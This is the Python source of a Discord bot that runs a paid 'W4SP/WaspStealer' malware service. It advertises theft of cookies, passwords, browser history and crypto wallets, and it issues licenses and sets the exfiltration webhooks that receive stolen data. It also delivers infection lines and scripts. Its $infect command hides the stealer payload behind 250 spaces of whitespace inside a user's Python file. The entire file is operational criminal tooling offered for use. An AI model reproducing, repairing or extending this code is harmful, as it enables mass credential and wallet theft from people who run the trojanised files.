import discord
from discord.ext import commands
from requests import get, post
from io import StringIO, BytesIO
from threading import Thread
import asyncio
import json

with open('config.json', 'r') as f:
    config = json.load(f)


token = config['BOT_SETTINGS']['token']

admin_key = config['GENERAL']['adminkey']

api = config['GENERAL']['host']
# W4SP BOT
# by billythegoat356
# uuid added embeds <3

PREFIX = "$"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

admin = config['GENERAL']['admin']

help = f"""
**[DOCS]**
{PREFIX}help
{PREFIX}features

**[USER]**
{PREFIX}webhook
{PREFIX}line
{PREFIX}script
{PREFIX}infect

**[ADMIN]**
{PREFIX}key <id>
{PREFIX}keys
{PREFIX}gen @user <reason>
{PREFIX}rm <id>
"""

features = """**Wasp Stealer | Features**
- FUD (Fully Undetectable)
- Cookie/Password Stealer
- History/Autofill Stealer
- Wallet Stealer
- File Stealer (Interesting Files)
- Wallet Stealer (Exodus, ect)
- Webhook Protection
"""


def get_keys():
    return post(f'{api}/keys', headers={'key': admin_key})

def get_user(json, info):
    for a in json:
        c = json[a]
        if str(info) == str(a):
            return a
        for b in c:
            if info in b.lower():
                return a
    return None

@bot.event
async def on_ready():
    print("Ready!")
    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}help"))
    bot.remove_command('help')

@bot.command()
async def gen(ctx, user: discord.User, *payment: str):

    if not payment:
        return
    if ctx.message.author.id not in admin:
        return

    id = user.id
    _usr = f'{user.name}#{user.discriminator}'
    usr = "".join(
        char for char in _usr if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?,.")
    payment = " ".join(payment)

    try:
        r = post(
            f'{api}/gen',
            headers={
                'key': admin_key,
                'id': str(id),
                'username': usr,
                'payment': payment})
        if r.status_code == 200:
            await ctx.channel.send(f"Welcome to **WaspStealer** <@{id}>!\n\nYou can list your commands with `>help`!")
        elif r.status_code == 203:
            await ctx.channel.send("Mmh, this user seems to be already registered!")

    except:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")


@bot.command()
async def keys(ctx):

    if ctx.message.author.id not in admin:
        return

    try:
        r = get_keys()
    except:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
        return
    await ctx.channel.send(f"There are actually `{len(r.json())}` users registered to WaspStealer!", file=discord.File(StringIO(r.text), filename='keys.json'))

@bot.command()
async def key(ctx, info: str):

    if ctx.message.author.id not in admin: return

    r = get_keys()
    info = info.lstrip('<@').rstrip('>')

    try: r = get_keys()
    except: 
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
        return

    else:
        r = r.json()
        pkey = get_user(r, info)
        if pkey is None:
            return await ctx.channel.send("User not found in database!")
        c = r[pkey]
        
        await ctx.channel.send(f"User found!\n\nPrivate key: `{pkey}`\nPublic_key: `{c[0]}`\nWebhook: `{c[1]}`\nRegistration date: `{c[2]}`\nUsername: `{c[3]}`\nID: `{c[4]}`\nPayment: `{c[5]}`")


@bot.command()
async def rm(ctx, info: str):

    if ctx.message.author.id not in admin:
        return

    try:
        r = get_keys()
    except BaseException:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
        return

    r = r.json()
    pkey = get_user(r, info)
    usr = r[pkey][3]

    if pkey is None:
        return await ctx.channel.send("User not found in database!")

    try:
        r = post(f'{api}/rm', headers={'key': admin_key, 'user_key': pkey})

        if r.status_code == 200:
            await ctx.channel.send(f"`{usr}`'s license has been removed.")
        else:
            await ctx.channel.send("This user isn't registered to WaspStealer!")

    except:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")

@bot.listen()
async def on_message(message):

    if message.author.id == bot.user.id:
        return

    content = message.content
    split_content = content.split()

    if content.startswith(f'{PREFIX}features'):

        embed = discord.Embed(
            title='W4SP-V2 FEATURES',
            description=features,
            color=discord.Color.yellow())

        embed.set_thumbnail(
            url='https://cdn.discordapp.com/attachments/1134928469881520228/1134936887438610482/unknown.png')
        embed.timestamp = message.created_at
        greeting = f"Here's all the features of W4SP-V2, {message.author}"
        embed.set_footer(text=greeting)
        await message.reply(embed=embed)
    # await bot.process_commands(message)

    if content.startswith(f'{PREFIX}help'):
        doc = content[5:].strip()

        embed = discord.Embed(
            title='W4SP-V2 - #1 Stealer',
            description=help,
            color=discord.Color.yellow())

        embed.set_thumbnail(
            url='https://cdn.discordapp.com/attachments/1134928469881520228/1134936887438610482/unknown.png')

        embed.timestamp = message.created_at

        greeting = f'Welcome to W4SP V2, {message.author}'
        embed.set_footer(text=greeting)
        await message.reply(embed=embed)

    # await bot.process_commands(message)

    if content in (f'{PREFIX}line', f'{PREFIX}script'):
        r = get_keys().json()
        pkey = None
        for a in r:
            for b in r[a]:
                if b == str(message.author.id):
                    pkey = r[a][0]
        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")

        r = get(f'{api}/script/{pkey}').text
        if content == f'{PREFIX}line':
            await message.reply(f"Paste this line in your program to infect whoever runs it!\n\n```py\n{r}```")
        elif content == f'{PREFIX}script':
            await message.reply("Send this Python file to infect whoever runs it!", file=discord.File(StringIO(r), filename='script.py'))

    if split_content[0] == f'{PREFIX}webhook' and len(split_content) == 2:
        webhook = split_content[1]

        r = get_keys().json()
        pkey = get_user(r, str(message.author.id))

        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")

        r = post(f'{api}/edit', headers={'key': pkey, 'webhook': webhook})

        if r.status_code == 401:
            await message.reply("Invalid webhook! Please try again.")
        else:
            await message.reply("Webhook updated successfully!")

    elif content == f'{PREFIX}infect' and len(message.attachments) == 1:
        r = get_keys().json()
        pkey = None
        for a in r:
            for b in r[a]:
                if b == str(message.author.id):
                    pkey = r[a][0]
        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")
        r = get(f'{api}/script/{pkey}').text
        content = await message.attachments[0].read()
        content = f"from builtins import *\ntype('Hello world!'){' '*250},{r}\n{content.decode('utf-8')}"
        await message.reply("Your file has been infected! Whoever runs it will get infected!", file=discord.File(StringIO(content), filename='infected.py'))

try:
    bot.run(token)
except KeyboardInterrupt:
    print('Goodbye!')
    exit()